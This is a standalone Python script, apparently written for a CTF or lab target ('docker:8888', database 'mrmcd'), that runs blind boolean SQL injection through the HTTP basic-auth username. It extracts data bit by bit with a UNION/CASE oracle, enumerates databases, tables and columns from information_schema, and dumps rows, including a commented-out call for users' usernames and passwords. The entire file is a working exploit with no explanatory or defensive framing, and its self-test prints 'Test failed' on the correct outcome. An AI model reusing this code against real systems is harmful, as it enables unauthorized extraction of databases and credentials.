import sys
import requests
import logging
DEBUG = True

session = requests.session()

if DEBUG:
    logging.basicConfig(level=logging.DEBUG)
else:
    logging.basicConfig(level=logging.INFO)
    
logging.getLogger("urllib3").setLevel(logging.INFO)
logger = logging.getLogger(__name__)



def loop(payload):
    # walk through substring and mask. returns a string
    i = 1
    result = ""
    while True:
        mask = 0x80
        c = 0x00
        
        while mask > 0x0: 
            brute_one_char = "SELECT ORD(SUBSTRING((%s),%d,1)) & %d" % (payload, i, mask)
            #print(brute_one_char)
            
            if oracle(brute_one_char):
                c = c | mask
            
            sys.stdout.flush()
            #print("\rTrying mask 0x%2x at position %d. Result: %s" % (mask, i, result), flush=False, end="")
            logger.debug("Trying mask 0x%2x at position %d. Result: %s" % (mask, i, result))
            mask = int(mask / 2)

        if c == 0x00:
            #print("\ndone")
            return result

        result += chr(c)     
        i = i + 1


def oracle(one_try):
    # checks statement and returns True or False
    payload = "' UNION ALL SELECT CASE WHEN (%s) THEN 'abc' ELSE (SELECT 1 UNION SELECT 2) END#" % one_try
    response = session.get("http://docker:8888", auth=(payload,'abc')).text
    return "Succsessfull" in response

def test():
    # test case for True and False
    ttrue =  oracle("2>1")
    print("2>1 is %s" % ttrue)

    ffalse =  oracle("1>2")
    print("1>2 is %s" % ffalse)

    if ttrue and not ffalse:
        print("Test failed. Exiting")
        sys.exit(1)
    else:
        print("Tests succeeded")

def get_all_db_names():
    payload_raw = "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA limit %d,1"
    logging.info("Fetching all db names")
    dbs = []
    for i in range(1000):
        payload = payload_raw % i
        db = loop(payload)
        if not db:
            return dbs
        else:
            dbs.append(db)
    return dbs

def get_current_db_name():
    payload = "SELECT DATABASE()"
    logging.info("Fetching current db name")
    db = loop(payload)
    return db

def get_tables(db=None):
    db = "DATABASE()" if not db else db
    payload_raw = "SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = '%s' limit %d,1"
    tables = []
    logging.info("Fetching all tables names")
    for i in range(1000):
        payload =  payload_raw % (db, i)
        logger.debug(payload)
        table = loop(payload)
        if not table:
            return tables
        else:
            tables.append(table)
    return tables

def get_columns(table, db=None):
    db = "DATABASE()" if not db else db
    payload_raw  = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '%s' AND TABLE_NAME = '%s' limit %d,1"
    columns = []
    logging.info("Fetching all column names of table %s" % table)
    for i in range(1000):
        payload = payload_raw % (db, table, i)
        logger.debug(payload)
        column = loop(payload)
        if not column:
            return columns
        else:
            columns.append(column)
    return columns


def get_data(db, table, *columns):
    payload_raw = "SELECT %s FROM %s.%s limit %d,1"
    db = "DATABASE()" if not db else db
    data = []
    logging.info("Fetching data for table %s" % table)
    for i in range(10000):
        rows = []
        for column in columns:
            payload = payload_raw % (column, db, table, i)
            logger.debug(payload)
            dat = loop(payload)
            if not dat:
                return data
            else:
                rows.append(dat)
        data.append(rows)
    return data

if __name__ == '__main__':
    #test()
    #print(get_current_db_name())
    #print(get_all_db_names())
    #print(get_tables("information_schema"))
    #print(get_columns("COLUMNS", "information_schema"))
    #print(get_data("mrmcd", "users", "username", "pass"))
    print(get_data("information_schema", "TABLES", "TABLE_NAME", "TABLE_SCHEMA"))

    exit()

